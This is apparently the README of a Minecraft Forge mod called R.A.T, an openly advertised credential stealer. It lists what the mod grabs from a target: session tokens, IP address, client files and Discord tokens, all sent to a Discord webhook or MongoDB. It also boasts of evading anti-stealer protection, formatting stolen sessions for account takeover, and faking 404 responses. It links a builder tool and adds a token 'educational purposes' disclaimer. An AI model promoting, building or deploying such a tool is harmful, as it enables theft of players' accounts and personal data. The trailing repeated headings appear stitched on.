<div align="center">

# R.A.T

<img src="https://bigrat.monster/media/bigrat.png" alt="logo" width="25%" />

**Retrieve Access Token**

![](https://img.shields.io/badge/MC--VERSION-FORGE_1.8.9-0?style=for-the-badge)
![](https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white)
![](https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white)
![](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

</div>

> Check out [Veilleux210/SUS-AUTH](https://github.com/Veilleux210/SUS-AUTH), a session id login mod.


## Features
- Grabs the **username, uuid, token, ip, feather file, essentials file and discord tokens** of a target as a *JSON*.

- Additionally, it stores a **formatted session string** ready to use with [Veilleux210/SUS-AUTH](https://github.com/Veilleux210/SUS-AUTH).
- JavaScript backend server which:
  - Checks if all fields in the JSON are present.
  - Controls requests and filters out spam requests by IPs.
  - Validates the token with Minecraft Auth servers before proceeding to output the data.

  It also fakes returning 404 codes to make the people think they successfully crashed the server 🤡.
  
- Makes nuking/trolling impossible, due to webhook/database urls being private.
- Can be easily configured to either use `Discord Webhooks` or `MongoDB` or both.
- Bypasses PizzaClient's SessionProtection.

- Uses:
  - *Express* for the backend server.
  - *MongoDB* for storing ratted users.
  - *Discord API* for sending messages to webhook.


> If you're having difficulties, you can try [BIG-RAT-FORGER](https://github.com/Veilleux210/BIG-RAT-FORGER), the automatic R.A.T builder.
- Server
  1. Clone the repository.
  2. Install dependencies.
  3. Run the server.



## Disclaimer
This is for educational purposes only. I am not responsible for any damage caused by this tool.

## License
GPLv3 © Veilleux210
# BIG-RAT
# SBRAT
# SBRAT
